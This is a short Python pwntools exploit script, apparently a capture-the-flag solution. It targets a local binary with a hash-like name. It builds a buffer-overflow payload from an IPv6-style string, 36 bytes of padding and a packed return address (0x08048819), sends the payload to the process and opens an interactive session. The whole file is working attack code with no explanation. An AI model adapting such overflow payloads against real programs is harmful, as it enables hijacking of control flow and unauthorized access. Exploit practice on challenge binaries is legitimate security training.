# -*- coding: utf-8 -*-
from pwn import *

p = process("./020d04ea8f10ac07c5b83f3d0910108b")
readips = 0x08048819
padding = "a" * 36
trueipv6 = "0:0:0:0:0:0:0:0" 
payload = trueipv6 + "\x2e" + padding
payload += p32(readips)
payload += "a" * (270 - len(payload))

p.sendline(payload)

p.interactive()